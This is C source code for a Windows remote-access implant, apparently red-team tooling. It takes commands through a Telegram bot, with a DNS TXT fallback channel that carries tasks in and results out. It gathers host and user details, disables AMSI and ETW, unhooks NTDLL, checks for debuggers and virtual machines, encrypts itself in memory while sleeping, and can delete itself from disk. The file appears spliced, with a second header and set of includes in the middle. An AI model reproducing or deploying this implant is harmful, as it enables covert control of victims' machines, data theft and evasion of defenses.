/*
 * fitnah_implant.c — RAM-only C2 implant
 *
 * Build (mingw-w64):
 *   x86_64-w64-mingw32-gcc fitnah_implant.c src/*.c \
 *     -Isrc -O2 -s -mwindows -static -lwininet -lbcrypt -lntdll -lws2_32 \
 *     -DFITNAH_BOT_TOKEN="..." -DFITNAH_CHAT_ID="..." \
 *     -DFITNAH_AGENT_ID="..." -DFITNAH_SLEEP=5 -DFITNAH_JITTER=20 \
 *     [-DFITNAH_DNS_DOMAIN="c2.redteam.example"] \
 *     -o fitnah.exe
 *
 * Compile-time defines (injected by builder/engine.py):
 *   FITNAH_BOT_TOKEN   — Telegram bot token (primary C2)
 *   FITNAH_CHAT_ID     — Per-agent group chat id
 *   FITNAH_AGENT_ID    — Unique agent string
 *   FITNAH_SLEEP       — Base beacon interval (seconds)
 *   FITNAH_JITTER      — Jitter percentage (0-100)
 *   FITNAH_AES_KEY     — 64-char hex AES-256 key (optional)
 *   FITNAH_AES_NONCE   — 24-char hex nonce seed   (optional)
 *   FITNAH_DNS_DOMAIN  — Authoritative NS domain for DNS fallback C2
 *                        (optional; when absent DNS fallback is compiled out)
 *
 * Transport priority:
 *   1. Telegram (primary)  — getUpdates long-poll over HTTPS → api.telegram.org
 *   2. DNS TXT (fallback)  — TXT queries to <agent_id>.<seqN>.tasks.<dns_domain>
 *      Operator encodes TASK JSON as base64 in TXT records; ACKs sent via
 *      <b64_ack>.<seqN>.ack.<dns_domain> A-queries (encoded in the 4th octet).
 *
 * Architecture:
 *   - Single thread; polls getUpdates with long-poll timeout=25s
 *   - On N_TG_FAILS consecutive Telegram failures → switch to DNS fallback
 *   - Sends CHECKIN on startup on the active transport
 *   - AMSI + ETW patched before any shell exec
 */

#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windns.h>
#include <stdlib.h>
#include <string.h>
#include <stdio.h>
#include <time.h>

#include "src/utils.h"
#include "src/http.h"
#include "src/crypto.h"
#include "src/bypass.h"
#include "src/commands.h"

/* Upgraded evasion layer (Havoc-adapted) */
#include "../fitnah/implant/implant.h"
/* Token impersonation module (Havoc/Sliver-derived) */
#include "../fitnah/implant/token/token.h"

/* ── Compile-time agent config (set by -D flags) ─────────────────────────── */
#ifndef FITNAH_BOT_TOKEN
#  error "FITNAH_BOT_TOKEN must be defined at compile time"
#endif
#ifndef FITNAH_CHAT_ID
#  error "FITNAH_CHAT_ID must be defined at compile time"
#endif
#ifndef FITNAH_AGENT_ID
#  define FITNAH_AGENT_ID "agent-unknown"
#endif
#ifndef FITNAH_SLEEP
#  define FITNAH_SLEEP 5
#endif
#ifndef FITNAH_JITTER
#  define FITNAH_JITTER 20
#endif

/* Stringify helper for -D values */
#define _STR(x) #x
#define STR(x)  _STR(x)

static const char *g_token    = STR(FITNAH_BOT_TOKEN);
static const char *g_chat_id  = STR(FITNAH_CHAT_ID);
static const char *g_agent_id = STR(FITNAH_AGENT_ID);
static const int   g_sleep    = FITNAH_SLEEP;
static const int   g_jitter   = FITNAH_JITTER;

/* ── Jittered sleep ──────────────────────────────────────────────────────── */
static void sleep_jittered(void) {
    int delta = (int)(g_sleep * (g_jitter / 100.0));
    int lo    = g_sleep - delta;
    int hi    = g_sleep + delta;
    if (lo < 1) lo = 1;
    int ms = (lo + (rand() % (hi - lo + 1))) * 1000;
    /* FoliageSleep: RC4-encrypts image during sleep, decrypts on wake.
       Falls back to plain Sleep() if FoliageInit() was not called. */
    FoliageSleep((DWORD)ms);
}

/* ── Transport state ─────────────────────────────────────────────────────── */
#define N_TG_FAILS_MAX   5    /* consecutive Telegram failures before DNS fallback */
static int  g_tg_fail_count = 0;
static BOOL g_dns_active    = FALSE;

/* ═══════════════════════════════════════════════════════════════════════════
 * DNS TXT C2 fallback
 *
 * Inspired by BishopFox/sliver implant/sliver/transports/dnsclient/dnsclient.go
 * (MIT License, Copyright 2019 Bishop Fox).  Ported to plain Win32 DnsQuery_A /
 * DnsRecordListFree — no external DNS library required.
 *
 * Protocol (operator side: an authoritative NS for FITNAH_DNS_DOMAIN):
 *
 *   TASK poll   : implant queries  TXT  <agentid>.t<seqN>.<dns_domain>
 *                 server returns   one or more TXT values concatenated =
 *                 base64-encoded TASK JSON
 *                 empty / NXDOMAIN = no pending task
 *
 *   ACK send    : implant queries  A    <b64chunk>.<seqN>.ack.<dns_domain>
 *                 server logs the query (4th octet of response is ignored)
 *                 multiple queries sent for chunks > 63 bytes
 *
 *   CHECKIN     : implant queries  TXT  <agentid>.ci.<dns_domain>
 *                 payload = base64(CHECKIN JSON), split into 60-byte labels
 *
 * Base64 uses the URL-safe alphabet (A-Z a-z 0-9 - _) so labels are valid DNS.
 * ═══════════════════════════════════════════════════════════════════════════ */

#ifdef FITNAH_DNS_DOMAIN

static const char *g_dns_domain = STR(FITNAH_DNS_DOMAIN);
static long long   g_dns_seq    = 0;   /* monotonic sequence number */

/* URL-safe base64 encode, no padding.  Returns heap buffer. */
static const char *B64_CHARS =
    "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_";

static char *dns_b64_encode(const uint8_t *data, size_t len, size_t *out_len) {
    size_t out_sz = ((len + 2) / 3) * 4 + 1;
    char  *out    = (char *)malloc(out_sz);
    if (!out) return NULL;
    size_t j = 0;
    for (size_t i = 0; i < len; i += 3) {
        uint32_t v  = (uint32_t)(data[i]) << 16;
        if (i + 1 < len) v |= (uint32_t)(data[i+1]) << 8;
        if (i + 2 < len) v |= (uint32_t)(data[i+2]);
        int n = (len - i < 3) ? (int)(len - i) + 1 : 4;
        for (int k = 3; k >= 4 - n; k--)
            out[j++] = B64_CHARS[(v >> (k * 6)) & 0x3F];
    }
    out[j]    = '\0';
    *out_len  = j;
    return out;
}

/* URL-safe base64 decode.  Returns heap buffer. */
static uint8_t *dns_b64_decode(const char *s, size_t *out_len) {
    static const int T[256] = {
        ['-']=62, ['_']=63,
        ['A']=0,['B']=1,['C']=2,['D']=3,['E']=4,['F']=5,['G']=6,['H']=7,
        ['I']=8,['J']=9,['K']=10,['L']=11,['M']=12,['N']=13,['O']=14,['P']=15,
        ['Q']=16,['R']=17,['S']=18,['T']=19,['U']=20,['V']=21,['W']=22,['X']=23,
        ['Y']=24,['Z']=25,
        ['a']=26,['b']=27,['c']=28,['d']=29,['e']=30,['f']=31,['g']=32,['h']=33,
        ['i']=34,['j']=35,['k']=36,['l']=37,['m']=38,['n']=39,['o']=40,['p']=41,
        ['q']=42,['r']=43,['s']=44,['t']=45,['u']=46,['v']=47,['w']=48,['x']=49,
        ['y']=50,['z']=51,
        ['0']=52,['1']=53,['2']=54,['3']=55,['4']=56,['5']=57,['6']=58,['7']=59,
        ['8']=60,['9']=61,
    };
    size_t  slen = strlen(s);
    uint8_t *out = (uint8_t *)malloc(slen);
    if (!out) return NULL;
    size_t j = 0;
    for (size_t i = 0; i + 3 < slen + 1; i += 4) {
        int a = T[(uint8_t)s[i]];
        int b = (i+1 < slen) ? T[(uint8_t)s[i+1]] : 0;
        int c = (i+2 < slen) ? T[(uint8_t)s[i+2]] : 0;
        int d = (i+3 < slen) ? T[(uint8_t)s[i+3]] : 0;
        uint32_t v = ((uint32_t)a<<18)|((uint32_t)b<<12)|((uint32_t)c<<6)|(uint32_t)d;
        out[j++] = (v >> 16) & 0xFF;
        if (i+2 < slen) out[j++] = (v >> 8) & 0xFF;
        if (i+3 < slen) out[j++] =  v        & 0xFF;
    }
    *out_len = j;
    return out;
}

/* Query a single TXT record, return first value or NULL */
static char *dns_query_txt(const char *fqdn) {
    DNS_RECORD *rec = NULL;
    DNS_STATUS  st  = DnsQuery_A(fqdn, DNS_TYPE_TEXT, DNS_QUERY_BYPASS_CACHE,
                                  NULL, &rec, NULL);
    if (st != ERROR_SUCCESS || !rec) return NULL;

    char *result = NULL;
    DNS_RECORD *r = rec;
    while (r) {
        if (r->wType == DNS_TYPE_TEXT && r->Data.TXT.dwStringCount > 0) {
            /* Concatenate all strings in the TXT record */
            size_t total = 0;
            for (DWORD i = 0; i < r->Data.TXT.dwStringCount; i++)
                total += strlen(r->Data.TXT.pStringArray[i]);
            result = (char *)malloc(total + 1);
            size_t off = 0;
            for (DWORD i = 0; i < r->Data.TXT.dwStringCount; i++) {
                size_t n = strlen(r->Data.TXT.pStringArray[i]);
                memcpy(result + off, r->Data.TXT.pStringArray[i], n);
                off += n;
            }
            result[total] = '\0';
            break;
        }
        r = r->pNext;
    }
    DnsRecordListFree(rec, DnsFreeRecordList);
    return result;
}

/* Fire-and-forget A query to encode ACK data in the label */
static void dns_exfil_query(const char *label) {
    char fqdn[512];
    snprintf(fqdn, sizeof(fqdn), "%s.%lld.ack.%s", label, g_dns_seq++, g_dns_domain);
    DNS_RECORD *rec = NULL;
    DnsQuery_A(fqdn, DNS_TYPE_A, DNS_QUERY_BYPASS_CACHE, NULL, &rec, NULL);
    if (rec) DnsRecordListFree(rec, DnsFreeRecordList);
}

/* Send CHECKIN over DNS */
static void dns_send_checkin(const char *checkin_json) {
    size_t  enc_len = 0;
    char   *enc     = dns_b64_encode((const uint8_t *)checkin_json,
                                     strlen(checkin_json), &enc_len);
    if (!enc) return;

    /* Split into ≤60-byte labels to keep FQDN ≤253 chars */
    size_t  chunk = 60;
    size_t  total = (enc_len + chunk - 1) / chunk;
    for (size_t i = 0; i < total; i++) {
        char label[128] = {0};
        size_t start = i * chunk;
        size_t n     = (start + chunk > enc_len) ? (enc_len - start) : chunk;
        snprintf(label, sizeof(label), "%.*s.%zu.ci.%s",
                 (int)n, enc + start, i, g_dns_domain);
        DNS_RECORD *rec = NULL;
        DnsQuery_A(label, DNS_TYPE_A, DNS_QUERY_BYPASS_CACHE, NULL, &rec, NULL);
        if (rec) DnsRecordListFree(rec, DnsFreeRecordList);
    }
    free(enc);
}

/* Poll for a TASK over DNS TXT.  Returns heap Task* or NULL. */
static Task *dns_poll_task(void) {
    char fqdn[512];
    snprintf(fqdn, sizeof(fqdn), "%s.t%lld.%s", g_agent_id, g_dns_seq, g_dns_domain);

    char *txt = dns_query_txt(fqdn);
    if (!txt) return NULL;

    /* Decode base64 payload */
    size_t  json_len = 0;
    uint8_t *json   = dns_b64_decode(txt, &json_len);
    free(txt);
    if (!json) return NULL;

    /* Null-terminate */
    char *json_str = (char *)malloc(json_len + 1);
    if (!json_str) { free(json); return NULL; }
    memcpy(json_str, json, json_len);
    json_str[json_len] = '\0';
    free(json);

    /* Must be a TASK */
    char *type = json_get_str(json_str, "type");
    if (!type || strcmp(type, "TASK") != 0) {
        free(type); free(json_str);
        return NULL;
    }
    free(type);

    Task *t = calloc(1, sizeof(Task));
    t->id        = json_get_str(json_str, "id");
    t->command   = json_get_str(json_str, "command");
    t->args_json = json_get_str(json_str, "args");
    free(json_str);
    g_dns_seq++;   /* consumed — advance sequence */

    if (!t->id || !t->command) { task_free(t); free(t); return NULL; }
    return t;
}

/* Send ACK over DNS (exfil ACK JSON encoded in label chunks) */
static void dns_send_ack(const char *task_id, const char *output) {
    char ack_json[65536];
    int  pos = 1;
    ack_json[0] = '{';
    pos = json_add_str(ack_json, pos, sizeof(ack_json), "type",   "ACK");   ack_json[pos++]=',';
    pos = json_add_str(ack_json, pos, sizeof(ack_json), "id",     task_id); ack_json[pos++]=',';
    pos = json_add_str(ack_json, pos, sizeof(ack_json), "status", "ok");    ack_json[pos++]=',';
    pos = json_add_str(ack_json, pos, sizeof(ack_json), "output", output);
    ack_json[pos++]='}'; ack_json[pos]='\0';

    size_t  enc_len = 0;
    char   *enc     = dns_b64_encode((const uint8_t *)ack_json,
                                     strlen(ack_json), &enc_len);
    if (!enc) return;

    size_t chunk = 60;
    size_t total = (enc_len + chunk - 1) / chunk;
    for (size_t i = 0; i < total; i++) {
        char label[128] = {0};
        size_t start = i * chunk;
        size_t n     = (start + chunk > enc_len) ? (enc_len - start) : chunk;
        memcpy(label, enc + start, n);
        label[n] = '\0';
        dns_exfil_query(label);
    }
    free(enc);
}

/* DNS beacon loop — runs when Telegram has failed N_TG_FAILS_MAX times */
static void dns_beacon_loop(void) {
    /* Send a checkin on first DNS activation */
    static BOOL dns_checked_in = FALSE;
    if (!dns_checked_in) {
        /* Build and send CHECKIN via DNS */
        char hostname[256] = {0}, username[256] = {0}, domain[256] = {0};
        DWORD hsz = sizeof(hostname), usz = sizeof(username), dsz = sizeof(domain);
        GetComputerNameA(hostname, &hsz);
        GetUserNameA(username, &usz);
        GetEnvironmentVariableA("USERDOMAIN", domain, dsz);

        char checkin[1024];
        snprintf(checkin, sizeof(checkin),
                 "{\"type\":\"CHECKIN\",\"agent_id\":\"%s\","
                 "\"hostname\":\"%s\",\"username\":\"%s\\\\%s\","
                 "\"transport\":\"dns\"}",
                 g_agent_id, hostname, domain, username);
        dns_send_checkin(checkin);
        dns_checked_in = TRUE;
    }

    /* Single poll iteration — called from beacon_loop() when Telegram down */
    Task *t = dns_poll_task();
    if (t) {
        char *result = cmd_dispatch(t);
        dns_send_ack(t->id, result ? result : "");
        free(result);
        task_free(t);
        free(t);
    }
}

#endif /* FITNAH_DNS_DOMAIN */

/* ── Send a text message to the operator chat ────────────────────────────── */
static void tg_send(const char *text) {
    char body[65536];
    int  pos = 1;
    body[0]  = '{';
    pos = json_add_str(body, pos, sizeof(body), "chat_id", g_chat_id);
    body[pos++] = ',';
    pos = json_add_str(body, pos, sizeof(body), "text", text);
    body[pos++] = '}';
    body[pos]   = '\0';
    HttpResponse r = tg_post(g_token, "sendMessage", body);
    http_response_free(&r);
}

/* ── Build and send CHECKIN message ─────────────────────────────────────────
 *
 * CHECKIN JSON:
 * {
 *   "type":     "CHECKIN",
 *   "agent_id": "<id>",
 *   "hostname": "<name>",
 *   "os":       "<caption>",
 *   "arch":     "<x64|x86>",
 *   "username": "<domain\\user>",
 *   "ip":       "<ipv4>"
 * }
 */
static void send_checkin(void) {
    char hostname[256]  = {0};
    char username[256]  = {0};
    char domain[256]    = {0};
    DWORD hsz = sizeof(hostname);
    DWORD usz = sizeof(username);
    DWORD dsz = sizeof(domain);
    GetComputerNameA(hostname, &hsz);
    GetUserNameA(username, &usz);
    /* get domain from env */
    GetEnvironmentVariableA("USERDOMAIN", domain, dsz);

    char fulluser[512];
    snprintf(fulluser, sizeof(fulluser), "%s\\%s", domain, username);

    /* get OS from registry */
    char os_name[256] = "Windows";
    HKEY hk;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE,
                      "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion",
                      0, KEY_READ, &hk) == ERROR_SUCCESS) {
        DWORD sz = sizeof(os_name);
        RegQueryValueExA(hk, "ProductName", NULL, NULL,
                         (LPBYTE)os_name, &sz);
        RegCloseKey(hk);
    }

    /* architecture */
    BOOL wow64 = FALSE;
    IsWow64Process(GetCurrentProcess(), &wow64);
    const char *arch = wow64 ? "x86_on_x64" :
#ifdef _WIN64
        "x64";
#else
        "x86";
#endif

    char body[4096];
    int  pos = 1;
    body[0]  = '{';
    pos = json_add_str(body, pos, sizeof(body), "type",     "CHECKIN");  body[pos++]=',';
    pos = json_add_str(body, pos, sizeof(body), "agent_id", g_agent_id); body[pos++]=',';
    pos = json_add_str(body, pos, sizeof(body), "hostname", hostname);    body[pos++]=',';
    pos = json_add_str(body, pos, sizeof(body), "os",       os_name);    body[pos++]=',';
    pos = json_add_str(body, pos, sizeof(body), "arch",     arch);       body[pos++]=',';
    pos = json_add_str(body, pos, sizeof(body), "username", fulluser);   body[pos++]=',';
    pos = json_add_str(body, pos, sizeof(body), "chat_id",  g_chat_id);
    body[pos++]='}'; body[pos]='\0';

    HttpResponse r = tg_post(g_token, "sendMessage", body);
    http_response_free(&r);
}

/* ── Send ACK for a completed task ──────────────────────────────────────────
 *
 * ACK JSON:
 * {
 *   "type":   "ACK",
 *   "id":     "<task_id>",
 *   "status": "ok",
 *   "output": "<result>"
 * }
 */
static void send_ack(const char *task_id, const char *output) {
    char body[65536];
    int  pos = 1;
    body[0]  = '{';
    pos = json_add_str(body, pos, sizeof(body), "type",   "ACK");    body[pos++]=',';
    pos = json_add_str(body, pos, sizeof(body), "id",     task_id);  body[pos++]=',';
    pos = json_add_str(body, pos, sizeof(body), "status", "ok");     body[pos++]=',';
    pos = json_add_str(body, pos, sizeof(body), "output", output);
    body[pos++]='}'; body[pos]='\0';
    tg_send(body);
}

/* ── Parse a Telegram update and extract the TASK if present ────────────── */
static Task *parse_task(const char *update_json) {
    /* updates arrive as Telegram Update objects; message.text contains JSON */
    char *msg_text = json_get_str(update_json, "text");
    if (!msg_text) return NULL;

    char *type = json_get_str(msg_text, "type");
    if (!type || strcmp(type, "TASK") != 0) {
        free(type); free(msg_text);
        return NULL;
    }
    free(type);

    Task *t = calloc(1, sizeof(Task));
    t->id        = json_get_str(msg_text, "id");
    t->command   = json_get_str(msg_text, "command");
    t->args_json = json_get_str(msg_text, "args");
    free(msg_text);

    if (!t->id || !t->command) {
        task_free(t); free(t);
        return NULL;
    }
    return t;
}

/* ── Main beacon loop ────────────────────────────────────────────────────── */
static void beacon_loop(void) {
    long long offset = 0;

    for (;;) {
        /* ── DNS fallback path ─────────────────────────────────────────────
         * If Telegram has failed N_TG_FAILS_MAX consecutive times, use DNS.
         * After DNS_RECOVER_TRIES successful DNS polls, retry Telegram once.
         */
#ifdef FITNAH_DNS_DOMAIN
        if (g_dns_active) {
            dns_beacon_loop();
            /* Try to recover Telegram every 10 DNS cycles */
            static int dns_cycle = 0;
            if (++dns_cycle >= 10) {
                dns_cycle       = 0;
                g_dns_active    = FALSE;   /* will retry Telegram next loop */
                g_tg_fail_count = 0;
            }
            sleep_jittered();
            continue;
        }
#endif

        /* ── Primary: Telegram getUpdates ─────────────────────────────── */
        char body[512];
        snprintf(body, sizeof(body),
                 "{\"offset\":%lld,\"timeout\":25,"
                 "\"allowed_updates\":[\"message\"]}", offset);

        HttpResponse r = tg_post(g_token, "getUpdates", body);

        if (!r.body) {
            g_tg_fail_count++;
#ifdef FITNAH_DNS_DOMAIN
            if (g_tg_fail_count >= N_TG_FAILS_MAX) g_dns_active = TRUE;
#endif
            sleep_jittered();
            continue;
        }

        g_tg_fail_count = 0;   /* reset on success */

        /* Parse result array — find all update objects */
        const char *p = r.body;
        while ((p = strstr(p, "\"update_id\":")) != NULL) {
            long long uid = json_get_int(p, "update_id");
            if (uid >= offset) offset = uid + 1;

            const char *msg_start = strstr(p, "\"message\":{");
            if (!msg_start) { p++; continue; }
            const char *msg_body = msg_start + 10;

            Task *t = parse_task(msg_body);
            if (t) {
                char *result = cmd_dispatch(t);
                send_ack(t->id, result ? result : "");
                free(result);
                task_free(t);
                free(t);
            }
            p++;
        }
        http_response_free(&r);
        sleep_jittered();
    }
}

/*
 * fitnah_implant.c — APT-grade RAM-only Telegram C2 implant
 */

#include <windows.h>
#include <stdlib.h>
#include <string.h>
#include <stdio.h>
#include <time.h>
#include <tlhelp32.h>

#include "src/utils.h"
#include "src/http.h"
#include "src/crypto.h"
#include "src/bypass.h"
#include "src/commands.h"

// External module unhooking (from unhook.c)
extern BOOL UnhookNtdll();

// External direct syscall initialization (from direct_syscall.c)
extern BOOL Syscall_Initialize();

/* ── Anti-Analysis Logic ─────────────────────────────────────────────────── */

/**
 * IsDebuggerPresent_Custom - Check for debuggers using PEB and timing
 */
BOOL IsDebuggerPresent_Custom() {
    // 1. PEB BeingDebugged flag
    #ifdef _WIN64
        unsigned char debugged = *(unsigned char*)(__readgsqword(0x60) + 2);
    #else
        unsigned char debugged = *(unsigned char*)(__readfsdword(0x30) + 2);
    #endif
    if (debugged) return TRUE;

    // 2. Timing check (RDTSC)
    unsigned __int64 t1 = __rdtsc();
    GetTickCount();
    unsigned __int64 t2 = __rdtsc();
    if ((t2 - t1) > 0x100000) return TRUE;

    return FALSE;
}

/**
 * IsVirtualMachine - Check for VM artifacts
 */
BOOL IsVirtualMachine() {
    // Check for common VM processes
    const char* vm_procs[] = { "vmsrvc.exe", "vmusrvc.exe", "vboxtray.exe", "vmtoolsd.exe", "df5serv.exe", "vboxservice.exe" };
    
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) return FALSE;

    PROCESSENTRY32 pe;
    pe.dwSize = sizeof(PROCESSENTRY32);

    if (Process32First(hSnapshot, &pe)) {
        do {
            for (int i = 0; i < 6; i++) {
                if (_stricmp(pe.szExeFile, vm_procs[i]) == 0) {
                    CloseHandle(hSnapshot);
                    return TRUE;
                }
            }
        } while (Process32Next(hSnapshot, &pe));
    }

    CloseHandle(hSnapshot);
    return FALSE;
}

/* ── Self-Deletion (Melt) Logic ───────────────────────────────────────────── */

/**
 * Melt - Delete the implant from disk while running
 */
VOID Melt() {
    CHAR szPath[MAX_PATH];
    CHAR szCmd[MAX_PATH * 2];
    GetModuleFileNameA(NULL, szPath, MAX_PATH);

    // Use cmd.exe to wait for the process to exit and then delete the file
    snprintf(szCmd, sizeof(szCmd), "/c timeout /t 3 & del /f /q \"%s\"", szPath);
    ShellExecuteA(NULL, "open", "cmd.exe", szCmd, NULL, SW_HIDE);
    ExitProcess(0);
}

/* ── Entry point ─────────────────────────────────────────────────────────── */
int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmd, int nShow) {
    (void)hInst; (void)hPrev; (void)lpCmd; (void)nShow;

    // 1. Anti-Analysis Check
    if (IsDebuggerPresent_Custom() || IsVirtualMachine()) {
        // Exit silently or perform decoy actions
        return 0;
    }

    // 2. Initialize indirect syscalls + stack spoof + Foliage + HwBp AMSI/ETW bypass
    if (!ImplantInit()) return 1;

    // 3. Unhook NTDLL by reading a clean copy from disk
    extern BOOL UnhookNtdll();
    UnhookNtdll();

    // 4. Fallback byte-patch AMSI + ETW (belt-and-suspenders with HwBp)
    bypass_amsi();
    bypass_etw();

    srand((unsigned)GetTickCount());

    /* 5. Check in with the C2 server */
    send_checkin();

    /* 6. Enter beacon loop — never returns */
    beacon_loop();

    return 0;
}
